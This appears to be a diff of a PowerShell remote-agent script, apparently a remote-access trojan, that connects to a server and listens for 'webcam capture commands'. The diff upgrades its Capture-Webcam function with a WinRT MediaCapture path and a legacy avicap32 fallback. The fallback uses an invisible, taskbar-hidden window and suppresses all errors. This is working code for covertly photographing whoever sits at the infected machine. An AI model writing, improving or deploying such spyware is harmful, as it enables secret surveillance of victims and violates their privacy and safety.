@@ -14,87 +14,129 @@ Write-Host "[*] Connecting to Server : $ServerURL"
 Write-Host "[*] Agent Identifier     : $AgentID"
 Write-Host "`n[+] Status: LISTENING for webcam capture commands...`n" -ForegroundColor Green
 
-# Function to capture photo from webcam using Windows API
+# Function to capture photo from webcam using modern Windows WinRT API (with legacy fallback)
 Function Capture-Webcam {
     $tempFile = "$env:TEMP\webcam_capture_$([DateTimeOffset]::UtcNow.ToUnixTimeSeconds()).jpg"
-    
-    $code = @"
-    using System;
-    using System.Runtime.InteropServices;
-    using System.Drawing;
-    using System.Drawing.Imaging;
-    using System.Windows.Forms;
-    using System.Threading;
+    if (Test-Path $tempFile) { Remove-Item $tempFile -Force -ErrorAction SilentlyContinue }
 
-    public class WebCamCapture {
-        [DllImport("avicap32.dll", EntryPoint = "capCreateCaptureWindowA")]
-        public static extern IntPtr capCreateCaptureWindowA(string name, int style, int x, int y, int w, int h, IntPtr hWnd, int id);
-        [DllImport("user32.dll")] public static extern IntPtr SendMessage(IntPtr hWnd, int msg, int wParam, int lParam);
-        [DllImport("user32.dll")] public static extern bool DestroyWindow(IntPtr hWnd);
+    # 1. Modern Windows 10/11 WinRT MediaCapture API
+    $mc = $null
+    try {
+        Add-Type -AssemblyName System.Runtime.WindowsRuntime -ErrorAction Stop
+        [Windows.Media.Capture.MediaCapture, Windows.Media, ContentType = WindowsRuntime] | Out-Null
+        [Windows.Media.MediaProperties.ImageEncodingProperties, Windows.Media, ContentType = WindowsRuntime] | Out-Null
+        [Windows.Storage.StorageFile, Windows.Storage, ContentType = WindowsRuntime] | Out-Null
 
-        public static bool Capture(string filePath, int cameraIndex) {
-            Form f = new Form();
-            f.Size = new Size(640, 480);
-            f.ShowInTaskbar = false;
-            f.FormBorderStyle = FormBorderStyle.None;
-            f.Opacity = 0;
-            f.Show();
-            Application.DoEvents();
+        $methods = [System.WindowsRuntimeSystemExtensions].GetMethods()
+        $asTaskAction = $methods | Where-Object { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncAction' }
+        $asTaskOp = $methods | Where-Object { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetGenericArguments().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -like 'IAsyncOperation*' }
 
-            IntPtr hWnd = capCreateCaptureWindowA("Webcam", 0x50000000, 0, 0, 640, 480, f.Handle, 1);
-            if (hWnd == IntPtr.Zero) { f.Close(); return false; }
+        New-Item -Path $tempFile -ItemType File -Force | Out-Null
+        $getFileOp = [Windows.Storage.StorageFile]::GetFileFromPathAsync($tempFile)
+        $getFileTask = ($asTaskOp.MakeGenericMethod([Windows.Storage.StorageFile])).Invoke($null, @($getFileOp))
+        $getFileTask.Wait(5000) | Out-Null
+        $storageFile = $getFileTask.Result
 
-            IntPtr conn = SendMessage(hWnd, 0x0400 + 10, cameraIndex, 0);
-            if (conn == IntPtr.Zero) {
-                DestroyWindow(hWnd);
-                f.Close();
-                return false;
-            }
+        $mc = New-Object Windows.Media.Capture.MediaCapture
+        $initOp = $mc.InitializeAsync()
+        ($asTaskAction.Invoke($null, @($initOp))).Wait(8000) | Out-Null
 
-            SendMessage(hWnd, 0x0400 + 50, 1, 0);
-            SendMessage(hWnd, 0x0400 + 52, 30, 0);
-            for (int i = 0; i < 10; i++) {
-                Application.DoEvents();
-                Thread.Sleep(100);
-            }
+        $props = [Windows.Media.MediaProperties.ImageEncodingProperties]::CreateJpeg()
+        $capOp = $mc.CapturePhotoToStorageFileAsync($props, $storageFile)
+        ($asTaskAction.Invoke($null, @($capOp))).Wait(8000) | Out-Null
+    } catch {
+    } finally {
+        if ($mc) {
+            try { $mc.Dispose() } catch {}
+        }
+    }
 
-            SendMessage(hWnd, 0x0400 + 60, 0, 0);
-            Application.DoEvents();
-            Thread.Sleep(150);
+    if ((Test-Path $tempFile) -and (Get-Item $tempFile).Length -gt 1000) {
+        return $tempFile
+    }
 
-            SendMessage(hWnd, 0x0400 + 41, 0, 0);
-            Application.DoEvents();
+    # 2. Legacy avicap32 fallback for Windows 7/8
+    if ([Environment]::OSVersion.Version.Major -lt 10) {
+        try {
+            $code = @"
+            using System;
+            using System.Runtime.InteropServices;
+            using System.Drawing;
+            using System.Drawing.Imaging;
+            using System.Windows.Forms;
+            using System.Threading;
 
-            bool ok = false;
-            try {
-                if (Clipboard.ContainsImage()) {
-                    using (Image img = Clipboard.GetImage()) {
-                        if (img != null) {
-                            img.Save(filePath, ImageFormat.Jpeg);
-                            ok = true;
-                        }
+            public class WebCamCaptureLegacy {
+                [DllImport("avicap32.dll", EntryPoint = "capCreateCaptureWindowA")]
+                public static extern IntPtr capCreateCaptureWindowA(string name, int style, int x, int y, int w, int h, IntPtr hWnd, int id);
+                [DllImport("user32.dll")] public static extern IntPtr SendMessage(IntPtr hWnd, int msg, int wParam, int lParam);
+                [DllImport("user32.dll")] public static extern bool DestroyWindow(IntPtr hWnd);
+
+                public static bool Capture(string filePath, int cameraIndex) {
+                    Form f = new Form();
+                    f.Size = new Size(640, 480);
+                    f.ShowInTaskbar = false;
+                    f.FormBorderStyle = FormBorderStyle.None;
+                    f.Opacity = 0;
+                    f.Show();
+                    Application.DoEvents();
+
+                    IntPtr hWnd = capCreateCaptureWindowA("Webcam", 0x50000000, 0, 0, 640, 480, f.Handle, 1);
+                    if (hWnd == IntPtr.Zero) { f.Close(); return false; }
+
+                    IntPtr conn = SendMessage(hWnd, 0x0400 + 10, cameraIndex, 0);
+                    if (conn == IntPtr.Zero) {
+                        DestroyWindow(hWnd);
+                        f.Close();
+                        return false;
                     }
+
+                    SendMessage(hWnd, 0x0400 + 50, 1, 0);
+                    SendMessage(hWnd, 0x0400 + 52, 30, 0);
+                    for (int i = 0; i < 8; i++) {
+                        Application.DoEvents();
+                        Thread.Sleep(100);
+                    }
+
+                    SendMessage(hWnd, 0x0400 + 60, 0, 0);
+                    Application.DoEvents();
+                    Thread.Sleep(100);
+
+                    SendMessage(hWnd, 0x0400 + 41, 0, 0);
+                    Application.DoEvents();
+
+                    bool ok = false;
+                    try {
+                        if (Clipboard.ContainsImage()) {
+                            using (Image img = Clipboard.GetImage()) {
+                                if (img != null) {
+                                    img.Save(filePath, ImageFormat.Jpeg);
+                                    ok = true;
+                                }
+                            }
+                        }
+                    } catch {}
+
+                    SendMessage(hWnd, 0x0400 + 11, 0, 0);
+                    DestroyWindow(hWnd);
+                    f.Close();
+
+                    return ok;
                 }
-            } catch {}
-
-            SendMessage(hWnd, 0x0400 + 11, 0, 0);
-            DestroyWindow(hWnd);
-            f.Close();
-
-            return ok;
-        }
-    }
+            }
 "@
+            Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
+            Add-Type -TypeDefinition $code -ReferencedAssemblies System.Drawing, System.Windows.Forms -ErrorAction SilentlyContinue
 
-    Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
-    Add-Type -TypeDefinition $code -ReferencedAssemblies System.Drawing, System.Windows.Forms -ErrorAction SilentlyContinue
-
-    for ($i = 0; $i -le 2; $i++) {
-        $result = [WebCamCapture]::Capture($tempFile, $i)
-        if ($result -and (Test-Path $tempFile)) {
-            return $tempFile
-        }
+            for ($i = 0; $i -le 1; $i++) {
+                $result = [WebCamCaptureLegacy]::Capture($tempFile, $i)
+                if ($result -and (Test-Path $tempFile)) {
+                    return $tempFile
+                }
+            }
+        } catch {}
     }
+
     return $null
 }
 
